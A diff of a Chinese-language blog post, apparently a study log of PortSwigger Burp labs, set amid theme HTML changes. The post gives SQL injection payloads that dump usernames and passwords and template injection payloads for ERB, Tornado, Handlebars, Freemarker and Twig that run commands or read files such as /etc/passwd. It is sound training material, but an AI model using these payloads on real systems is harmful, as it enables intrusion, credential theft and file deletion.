@@ -1,106 +1,309 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  
 
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-  <title>2023/04/15：burplabs从0开始 | Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="这里的题目看起来更像真实的场景可惜有点卡，下面的解答视频有一种没带眼镜的美有完整教程，很行 SQL injectionapprentice开网页的时间比写还久（恼） SQL injection vulnerability in WHERE clause allowing retrieval of hidden data第一题为get注入 单引号闭合然后1&#x3D;1就完事了有点卡反应比较慢  SQL in">
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="这里的题目看起来更像真实的场景可惜有点卡，下面的解答视频有一种没带眼镜的美有完整教程，很行 SQL injectionapprentice开网页的时间比写还久（恼） SQL injection vulnerability in WHERE clause allowing retrieval of hidden data第一题为get注入 单引号闭合然后1&#x3D;1就完事了有点卡反应比较慢  SQL in">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2023&#x2F;04&#x2F;15：burplabs从0开始">
 <meta property="og:url" content="http://example.com/2023/04/27/burplab/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="这里的题目看起来更像真实的场景可惜有点卡，下面的解答视频有一种没带眼镜的美有完整教程，很行 SQL injectionapprentice开网页的时间比写还久（恼） SQL injection vulnerability in WHERE clause allowing retrieval of hidden data第一题为get注入 单引号闭合然后1&#x3D;1就完事了有点卡反应比较慢  SQL in">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/04/27/burplab/lab1.png">
+<meta property="og:image" content="http://example.com/2023/04/27/burplab/lab2.png">
+<meta property="og:image" content="http://example.com/2023/04/27/burplab/lab3.png">
 <meta property="article:published_time" content="2023-04-27T12:05:50.000Z">
-<meta property="article:modified_time" content="2023-08-10T12:21:42.149Z">
+<meta property="article:modified_time" content="2023-08-19T15:20:49.635Z">
 <meta property="article:author" content="John Doe">
-<meta name="twitter:card" content="summary">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="icon" href="/favicon.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/04/27/burplab/lab1.png">
   
   
-    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
   
-  
-<link rel="stylesheet" href="/css/style.css">
+  <title>2023/04/15：burplabs从0开始 - Hexo</title>
 
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
 <meta name="generator" content="Hexo 5.4.2"></head>
 
+
 <body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
-    </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
-        
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
-        
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
-    </div>
-  </div>
-</header>
-      <div class="outer">
-        <section id="main"><article id="post-burplab" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2023/04/27/burplab/" class="article-date">
-  <time datetime="2023-04-27T12:05:50.000Z" itemprop="datePublished">2023-04-27</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="article-title" itemprop="name">
-      2023/04/15：burplabs从0开始
-    </h1>
   
 
-      </header>
+  <header>
     
-    <div class="article-entry" itemprop="articleBody">
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2023/04/15：burplabs从0开始"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-27 20:05" pubdate>
+          April 27, 2023 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.4k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          20 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
       
-        <p>这里的题目看起来更像真实的场景<br>可惜有点卡，下面的解答视频有一种没带眼镜的美<br>有完整教程，很行</p>
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2023/04/15：burplabs从0开始</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>这里的题目看起来更像真实的场景<br>可惜有点卡，下面的解答视频有一种没带眼镜的美<br>有完整教程，很行</p>
 <h2 id="SQL-injection"><a href="#SQL-injection" class="headerlink" title="SQL injection"></a>SQL injection</h2><h3 id="apprentice"><a href="#apprentice" class="headerlink" title="apprentice"></a>apprentice</h3><p>开网页的时间比写还久（恼）</p>
 <h4 id="SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data"><a href="#SQL-injection-vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data" class="headerlink" title="SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"></a>SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</h4><p>第一题为get注入 单引号闭合然后1=1就完事了<br>有点卡反应比较慢</p>
-
+<img src="/2023/04/27/burplab/lab1.png" srcset="/img/loading.gif" lazyload class="">
 <h4 id="SQL-injection-vulnerability-allowing-login-bypass"><a href="#SQL-injection-vulnerability-allowing-login-bypass" class="headerlink" title="SQL injection vulnerability allowing login bypass"></a>SQL injection vulnerability allowing login bypass</h4><p>简单的万能密码，啥过滤也没有</p>
-
+<img src="/2023/04/27/burplab/lab2.png" srcset="/img/loading.gif" lazyload class="">
 <h3 id="practitoner"><a href="#practitoner" class="headerlink" title="practitoner"></a>practitoner</h3><h4 id="SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query"><a href="#SQL-injection-UNION-attack-determining-the-number-of-columns-returned-by-the-query" class="headerlink" title="SQL injection UNION attack, determining the number of columns returned by the query"></a>SQL injection UNION attack, determining the number of columns returned by the query</h4><p>联合查询第一步，column的数量</p>
-
+<img src="/2023/04/27/burplab/lab3.png" srcset="/img/loading.gif" lazyload class="">
 <p>一直用null测出数量</p>
 <h4 id="SQL-injection-UNION-attack-finding-a-column-containing-text"><a href="#SQL-injection-UNION-attack-finding-a-column-containing-text" class="headerlink" title="SQL injection UNION attack, finding a column containing text"></a>SQL injection UNION attack, finding a column containing text</h4><p>union select，找到指定column，把上一题的一个null替换即可</p>
 <h4 id="SQL-injection-UNION-attack-retrieving-data-from-other-tables"><a href="#SQL-injection-UNION-attack-retrieving-data-from-other-tables" class="headerlink" title="SQL injection UNION attack, retrieving data from other tables"></a>SQL injection UNION attack, retrieving data from other tables</h4><p>get传参的联合注入，直接在地址栏注就行：’+UNION+SELECT+username,+password+FROM+users–<br>回显在下面文章标题（？）那里，感觉很奇怪好像也很合理</p>
-<h4 id="SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column"><a href="#SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column" class="headerlink" title="SQL injection UNION attack, retrieving multiple values in a single column"></a>SQL injection UNION attack, retrieving multiple values in a single column</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="string">&#x27; UNION SELECT username || &#x27;</span>~<span class="string">&#x27; || password FROM users--</span></span><br></pre></td></tr></table></figure>
+<h4 id="SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column"><a href="#SQL-injection-UNION-attack-retrieving-multiple-values-in-a-single-column" class="headerlink" title="SQL injection UNION attack, retrieving multiple values in a single column"></a>SQL injection UNION attack, retrieving multiple values in a single column</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-string">&#x27; UNION SELECT username || &#x27;</span>~<span class="hljs-string">&#x27; || password FROM users--</span><br></code></pre></td></tr></table></figure>
 <p>emm大概是一种联合查询技巧以便更好的得到所需数据吧</p>
+<h4 id="SQL-injection-attack-querying-the-database-type-and-version-on-Oracle"><a href="#SQL-injection-attack-querying-the-database-type-and-version-on-Oracle" class="headerlink" title="SQL injection attack, querying the database type and version on Oracle"></a>SQL injection attack, querying the database type and version on Oracle</h4><p>注入点在url栏中的category，输入单引号报错<br>经测试为两个字段</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">?category=&#x27;+<span class="hljs-built_in">UNION</span>+<span class="hljs-built_in">SELECT</span>+BANNER,+<span class="hljs-built_in">NULL</span>+FROM+v$version--<br></code></pre></td></tr></table></figure>
+<h4 id="SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft"><a href="#SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft" class="headerlink" title="SQL injection attack, querying the database type and version on MySQL and Microsoft"></a>SQL injection attack, querying the database type and version on MySQL and Microsoft</h4><p>与上类似，但出不来，输啥都报错</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">&#x27;+<span class="hljs-built_in">UNION</span>+<span class="hljs-built_in">SELECT</span>+<span class="hljs-comment">@@</span>version,+<span class="hljs-built_in">NULL</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
+<h4 id="SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases"><a href="#SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases" class="headerlink" title="SQL injection attack, listing the database contents on non-Oracle databases"></a>SQL injection attack, listing the database contents on non-Oracle databases</h4><p>本题需要获得管理员密码<br>经检测仍为两个字段，均回显</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">&#x27;+<span class="hljs-built_in">UNION</span>+<span class="hljs-built_in">SELECT</span>+table_name,+<span class="hljs-built_in">NULL</span>+FROM+information_schema.tables--<br></code></pre></td></tr></table></figure>
+<p>无NULL则报错，获得需要的user表</p>
+<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&#x27;+UNION+<span class="hljs-keyword">SELECT</span>+column_name,+<span class="hljs-literal">NULL</span>+<span class="hljs-keyword">FROM</span>+information_schema.columns+<span class="hljs-keyword">WHERE</span>+table_name=<span class="hljs-string">&#x27;users_ ...&#x27;</span>--<br></code></pre></td></tr></table></figure>
+<p>查找需要的字段</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">&#x27;+UNION+SELECT+username_ <span class="hljs-string">...</span>,+password_ <span class="hljs-string">...</span>+FROM+users_ <span class="hljs-string">...--</span><br></code></pre></td></tr></table></figure>
+<p>找到管理员密码，登录</p>
+<h4 id="SQL-injection-attack-listing-the-database-contents-on-Oracle"><a href="#SQL-injection-attack-listing-the-database-contents-on-Oracle" class="headerlink" title="SQL injection attack, listing the database contents on Oracle"></a>SQL injection attack, listing the database contents on Oracle</h4><p>与上大同小异</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">&#x27;+UNION+<span class="hljs-keyword">SELECT</span>+<span class="hljs-symbol">&#x27;abc</span><span class="hljs-string">&#x27;,&#x27;</span>def&#x27;+FROM+dual<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+<p>检测回显位需添加<code>FROM dual</code>语句</p>
+<h4 id="Blind-SQL-injection-with-conditional-responses"><a href="#Blind-SQL-injection-with-conditional-responses" class="headerlink" title="Blind SQL injection with conditional responses"></a>Blind SQL injection with conditional responses</h4><p>cookie的布尔盲注<br>学了下咋用burp自带功能完成盲注</p>
 <h2 id="Server-side-template-injection"><a href="#Server-side-template-injection" class="headerlink" title="Server-side template injection"></a>Server-side template injection</h2><p>不少没见过的模板</p>
 <h3 id="practitioner"><a href="#practitioner" class="headerlink" title="practitioner"></a>practitioner</h3><h4 id="Basic-server-side-template-injection"><a href="#Basic-server-side-template-injection" class="headerlink" title="Basic server-side template injection"></a>Basic server-side template injection</h4><p>题目要求删除<code>morale.txt</code>文件，根据题目描述需要了解ERB文档查看如何执行系统命令<br>点击详细信息，观察上方url，存在可能注入的GET变量message<br>尝试注入<code>&lt;%= 2*2 %&gt;</code>，回显为4，为注入点<br>输入<code>&lt;%= system(&quot;rm /home/carlos/morale.txt&quot;) %&gt;</code></p>
 <h4 id="Basic-server-side-template-injection-code-context"><a href="#Basic-server-side-template-injection-code-context" class="headerlink" title="Basic server-side template injection (code context)"></a>Basic server-side template injection (code context)</h4><p>根据提示登录账号，来到账号页面，修改名字显示<br>抓包，尝试可能的注入点<code>blog-post-author-display=user.name&#125;&#125;&#123;&#123;7*7&#125;&#125;</code><br>发评论，名字显示中有49，存在注入点<br>根据描述模板类型为Tornado(Python)，构造语句<code>user.name&#125;&#125;&#123;%25+import+os+%25&#125;&#123;&#123;os.system('rm%20/home/carlos/morale.txt')`
@@ -111,7 +314,7 @@
 本题模板未知，先观察url的message变量存在注入点，进行尝试：`$&#123;&#123;<%[%'"&#125;&#125;%\`通过报错信息可知模板为Handlebars
 查询得知使用此方式执行命令：`require("child_process").exec("rm /home/carlos/morale.txt")`
 使用如下方式调用：
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">wrtz&#123;&#123;#with &quot;s&quot; as |string|&#125;&#125;</span><br><span class="line">    &#123;&#123;#with &quot;e&quot;&#125;&#125;</span><br><span class="line">        &#123;&#123;#with split as |conslist|&#125;&#125;</span><br><span class="line">            &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">            &#123;&#123;this.push (lookup string.sub &quot;constructor&quot;)&#125;&#125;</span><br><span class="line">            &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">            &#123;&#123;#with string.split as |codelist|&#125;&#125;</span><br><span class="line">                &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">                &#123;&#123;this.push &quot;return require(&#x27;child_process&#x27;).exec(&#x27;rm /home/carlos/morale.txt&#x27;);&quot;&#125;&#125;</span><br><span class="line">                &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">                &#123;&#123;#each conslist&#125;&#125;</span><br><span class="line">                    &#123;&#123;#with (string.sub.apply 0 codelist)&#125;&#125;</span><br><span class="line">                        &#123;&#123;this&#125;&#125;</span><br><span class="line">                    &#123;&#123;/with&#125;&#125;</span><br><span class="line">                &#123;&#123;/each&#125;&#125;</span><br><span class="line">            &#123;&#123;/with&#125;&#125;</span><br><span class="line">        &#123;&#123;/with&#125;&#125;</span><br><span class="line">    &#123;&#123;/with&#125;&#125;</span><br><span class="line">&#123;&#123;/with&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">wrtz</span><span class="hljs-template-tag">&#123;&#123;#<span class="hljs-name"><span class="hljs-built_in">with</span></span> <span class="hljs-string">&quot;s&quot;</span> <span class="hljs-keyword">as</span> |string|&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;&#123;#<span class="hljs-name"><span class="hljs-built_in">with</span></span> <span class="hljs-string">&quot;e&quot;</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;&#123;#<span class="hljs-name"><span class="hljs-built_in">with</span></span> split <span class="hljs-keyword">as</span> |conslist|&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">            </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">this.pop</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">            </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">this.push</span> (<span class="hljs-name"><span class="hljs-built_in">lookup</span></span> string.sub <span class="hljs-string">&quot;constructor&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">            </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">this.pop</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">            </span><span class="hljs-template-tag">&#123;&#123;#<span class="hljs-name"><span class="hljs-built_in">with</span></span> string.split <span class="hljs-keyword">as</span> |codelist|&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">                </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">this.pop</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">                </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">this.push</span> <span class="hljs-string">&quot;return require(&#x27;child_process&#x27;).exec(&#x27;rm /home/carlos/morale.txt&#x27;);&quot;</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">                </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">this.pop</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">                </span><span class="hljs-template-tag">&#123;&#123;#<span class="hljs-name"><span class="hljs-built_in">each</span></span> conslist&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">                    </span><span class="hljs-template-tag">&#123;&#123;#<span class="hljs-name"><span class="hljs-built_in">with</span></span> (<span class="hljs-name">string.sub.apply</span> <span class="hljs-number">0</span> codelist)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">                        </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">this</span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">                    </span><span class="hljs-template-tag">&#123;&#123;/<span class="hljs-name"><span class="hljs-built_in">with</span></span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">                </span><span class="hljs-template-tag">&#123;&#123;/<span class="hljs-name"><span class="hljs-built_in">each</span></span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">            </span><span class="hljs-template-tag">&#123;&#123;/<span class="hljs-name"><span class="hljs-built_in">with</span></span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">        </span><span class="hljs-template-tag">&#123;&#123;/<span class="hljs-name"><span class="hljs-built_in">with</span></span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">    </span><span class="hljs-template-tag">&#123;&#123;/<span class="hljs-name"><span class="hljs-built_in">with</span></span>&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;&#123;/<span class="hljs-name"><span class="hljs-built_in">with</span></span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
 编码后上传
 #### Server-side template injection with information disclosure via user-supplied objects
 该题需要获得一串字符提交
@@ -119,158 +322,418 @@
 使用`&#123;% debug %&#125;</code>查询可使用settings类，其中包含SECRET_KEY<br>输入<code>&#123;&#123;settings.SECRET_KEY&#125;&#125;</code>通关</p>
 <h3 id="expert"><a href="#expert" class="headerlink" title="expert"></a>expert</h3><h4 id="Server-side-template-injection-in-a-sandboxed-environment"><a href="#Server-side-template-injection-in-a-sandboxed-environment" class="headerlink" title="Server-side template injection in a sandboxed environment"></a>Server-side template injection in a sandboxed environment</h4><p>依题意，使用Freemarker模板，需要获得my_password.txt<br>查找Object类，得知可通过product使用<code>$&#123;object.getClass()&#125;</code><br>payload:<br><code>$&#123;product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(&#39;/home/carlos/my_password.txt&#39;).toURL().openStream().readAllBytes()?join(&quot; &quot;)&#125;</code><br>结果为ASCII，需转换</p>
 <h4 id="Server-side-template-injection-with-a-custom-exploit"><a href="#Server-side-template-injection-with-a-custom-exploit" class="headerlink" title="Server-side template injection with a custom exploit"></a>Server-side template injection with a custom exploit</h4><p>需删除/.ssh/id_rsa文件夹<br>登录后更改Preferred name，检查burp的post发现user.name，使用了user对象<br>将其改为user后发包会报错，显示模板为Twig<br>在上传头像处上传php文件显示错误：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: application/octet-stream in /home/carlos/User.php:28</span><br><span class="line">Stack trace:</span><br><span class="line">#0 /home/carlos/avatar_upload.php(19): User-&gt;setAvatar(&#x27;/tmp/1.php&#x27;, &#x27;application/oct...&#x27;)</span><br><span class="line">#1 &#123;main&#125;</span><br><span class="line">  thrown in /home/carlos/User.php on line 28</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">PHP Fatal error:  Uncaught Exception: Uploaded file mime type is not an image: application<span class="hljs-regexp">/octet-stream in /</span>home<span class="hljs-regexp">/carlos/</span>User.php:<span class="hljs-number">28</span><br>Stack trace:<br><span class="hljs-comment">#0 /home/carlos/avatar_upload.php(19): User-&gt;setAvatar(&#x27;/tmp/1.php&#x27;, &#x27;application/oct...&#x27;)</span><br><span class="hljs-comment">#1 &#123;main&#125;</span><br>  thrown <span class="hljs-keyword">in</span> <span class="hljs-regexp">/home/</span>carlos/User.php on line <span class="hljs-number">28</span><br></code></pre></td></tr></table></figure>
 <p>这些错误信息提供了一些关键点<br>继续抓修改name的包，尝试使用user.setAvatar()会在第一个博客显示报错信息，说明利用的可能<br>执行<code>user.setAvatar(&#39;/etc/passwd&#39;,&#39;image/jpg&#39;)</code>可获得接下来需要找到的目标文件<br>执行<code>user.setAvatar(&#39;/home/carlos/User.php&#39;,&#39;image/jpg&#39;)</code>获得可执行删除的函数gdprDelete()<br>（注意题目警告不能删错了）</p>
 <h2 id="File-upload-vulnerabilities"><a href="#File-upload-vulnerabilities" class="headerlink" title="File upload vulnerabilities"></a>File upload vulnerabilities</h2><p>文件上传复习</p>
 <h3 id="apprentice-1"><a href="#apprentice-1" class="headerlink" title="apprentice"></a>apprentice</h3><h4 id="Remote-code-execution-via-web-shell-upload"><a href="#Remote-code-execution-via-web-shell-upload" class="headerlink" title="Remote code execution via web shell upload"></a>Remote code execution via web shell upload</h4><p>用php文件，写上</p>
